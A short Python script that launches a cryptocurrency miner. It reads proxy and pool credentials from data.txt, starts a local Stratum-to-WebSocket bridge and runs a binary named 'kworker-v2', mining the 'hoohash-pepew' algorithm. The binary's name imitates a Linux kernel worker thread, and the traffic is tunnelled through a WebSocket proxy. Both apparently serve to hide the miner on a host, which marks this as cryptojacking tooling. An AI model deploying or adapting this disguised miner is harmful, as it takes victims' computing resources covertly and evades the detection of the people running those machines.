import os
import sys
import threading
import time
import subprocess
import base64
import json

# Add libs to path
sys.path.append(os.path.join(os.path.dirname(__file__), 'libs'))

def run_bridge(local_port, ws_url):
    from bridge import StratumBridge
    bridge = StratumBridge(local_port, ws_url)
    bridge.run()

def load_config(file_path):
    config = {}
    if not os.path.exists(file_path):
        return None
    with open(file_path, 'r') as f:
        for line in f:
            if '=' in line:
                k, v = line.strip().split('=', 1)
                config[k] = v
    return config

def main():
    config = load_config('data.txt')
    if not config:
        print("[!] Error: data.txt not found")
        return

    local_port = 3333
    ws_url = config.get('proxy')
    username = config.get('username')
    password = config.get('password')
    threads = config.get('threads', '1')

    if not ws_url:
        print("[!] Error: proxy URL not found in data.txt")
        return

    # Start bridge in background
    print(f"[*] Starting bridge to {ws_url}...")
    bridge_thread = threading.Thread(target=run_bridge, args=(local_port, ws_url), daemon=True)
    bridge_thread.start()
    
    time.sleep(2) # Wait for bridge to bind

    # Start C-miner
    print(f"[*] Launching C-miner on {threads} threads...")
    miner_cmd = [
        "./kworker-v2", 
        "-a", "hoohash-pepew", 
        "-o", f"stratum+tcp://127.0.0.1:{local_port}", 
        "-u", username, 
        "-p", password, 
        "-t", str(threads)
    ]
    
    try:
        subprocess.run(miner_cmd)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
    except Exception as e:
        print(f"[!] Miner error: {e}")

if __name__ == "__main__":
    main()
